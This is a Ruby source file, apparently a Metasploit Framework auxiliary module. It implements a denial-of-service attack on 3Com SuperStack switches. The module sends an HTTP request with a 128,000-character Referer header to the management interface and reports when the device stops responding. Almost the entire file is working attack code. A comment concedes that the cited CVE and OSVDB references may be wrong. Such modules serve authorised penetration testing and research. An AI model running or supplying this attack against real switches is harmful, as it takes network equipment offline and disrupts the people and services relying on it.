##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '3Com SuperStack Switch Denial of Service',
			'Description'    => %q{
				This module causes a temporary denial of service condition
				against 3Com SuperStack switches. By sending excessive data
				to the HTTP Management interface, the switch stops responding
				temporarily. The device does not reset. Tested successfully
				against a 3300SM firmware v2.66. Reported to affect versions
				prior to v2.72.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					# patrickw - I am not sure if these are correct, but the closest match!
					[ 'OSVDB', '7246' ],
					[ 'CVE', '2004-2691' ],
					[ 'URL', 'http://support.3com.com/infodeli/tools/switches/dna1695-0aaa17.pdf' ],
				],
			'DisclosureDate' => 'Jun 24 2004'))

		register_options( [ Opt::RPORT(80) ], self.class )
	end

	def run
		begin
			connect
			print_status("Sending DoS packet to #{rhost}:#{rport}")

			sploit = "GET / HTTP/1.0\r\n"
			sploit << "Referer: " + Rex::Text.rand_text_alpha(1) * 128000

			sock.put(sploit +"\r\n\r\n")
			disconnect
			print_status("DoS packet unsuccessful.")
		rescue ::Rex::ConnectionRefused
			print_status("Unable to connect to #{rhost}:#{rport}.")
		rescue ::Errno::ECONNRESET
			print_status("DoS packet successful. #{rhost} not responding.")
		end

	end

end
